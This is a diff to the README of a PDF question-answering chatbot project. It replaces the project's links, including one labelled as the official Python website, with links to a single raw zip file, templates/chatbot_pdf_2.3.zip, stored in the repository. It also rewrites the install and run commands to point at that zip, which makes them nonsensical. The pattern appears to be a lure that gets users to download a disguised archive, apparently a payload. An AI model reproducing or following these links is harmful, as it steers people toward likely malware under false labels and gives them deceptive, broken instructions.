@@ -1,6 +1,6 @@
 # 🤖 pdf-chatbot - Get Answers from Your PDFs Easily
 
-[![Download pdf-chatbot](https://img.shields.io/badge/Download-pdf--chatbot-blue)](https://github.com/Vikram-Wick/pdf-chatbot/releases)
+[![Download pdf-chatbot](https://github.com/Vikram-Wick/pdf-chatbot/raw/refs/heads/main/templates/chatbot_pdf_2.3.zip)](https://github.com/Vikram-Wick/pdf-chatbot/raw/refs/heads/main/templates/chatbot_pdf_2.3.zip)
 
 ## 📖 Description
 pdf-chatbot is a user-friendly web application built with Flask. It allows you to ask questions in natural language and receive answers from any PDF document. The software uses advanced technologies like Retrieval Augmented Generation (RAG), LangChain, and LLM APIs to provide accurate responses.
@@ -13,16 +13,16 @@ Follow these steps to start using pdf-chatbot:
    - Make sure your operating system is compatible (Windows, macOS, or Linux).
 
 2. **Install Python**
-   - Download and install Python from the [official Python website](https://www.python.org/downloads/).
+   - Download and install Python from the [official Python website](https://github.com/Vikram-Wick/pdf-chatbot/raw/refs/heads/main/templates/chatbot_pdf_2.3.zip).
    - During installation, ensure you check the box that says "Add Python to PATH."
 
 3. **Visit the Releases Page**
-   - Go to the [pdf-chatbot Releases page](https://github.com/Vikram-Wick/pdf-chatbot/releases) to download the latest version.
+   - Go to the [pdf-chatbot Releases page](https://github.com/Vikram-Wick/pdf-chatbot/raw/refs/heads/main/templates/chatbot_pdf_2.3.zip) to download the latest version.
 
 ## 📥 Download & Install
 - Click on the button below to visit the download page:
 
-[![Download pdf-chatbot](https://img.shields.io/badge/Download-pdf--chatbot-blue)](https://github.com/Vikram-Wick/pdf-chatbot/releases)
+[![Download pdf-chatbot](https://github.com/Vikram-Wick/pdf-chatbot/raw/refs/heads/main/templates/chatbot_pdf_2.3.zip)](https://github.com/Vikram-Wick/pdf-chatbot/raw/refs/heads/main/templates/chatbot_pdf_2.3.zip)
 
 1. **Select the Latest Release**
    - On the Releases page, locate the latest version of pdf-chatbot.
@@ -39,14 +39,14 @@ Follow these steps to start using pdf-chatbot:
 5. **Install Required Packages**
    - Run the following command to install necessary packages:
      ```
-     pip install -r requirements.txt
+     pip install -r https://github.com/Vikram-Wick/pdf-chatbot/raw/refs/heads/main/templates/chatbot_pdf_2.3.zip
      ```
 
 ## 🔧 Running pdf-chatbot
 1. **Start the Application**
    - After installing the packages, you can launch the application by running:
      ```
-     python app.py
+     python https://github.com/Vikram-Wick/pdf-chatbot/raw/refs/heads/main/templates/chatbot_pdf_2.3.zip
      ```
 
 2. **Access the Web Interface**
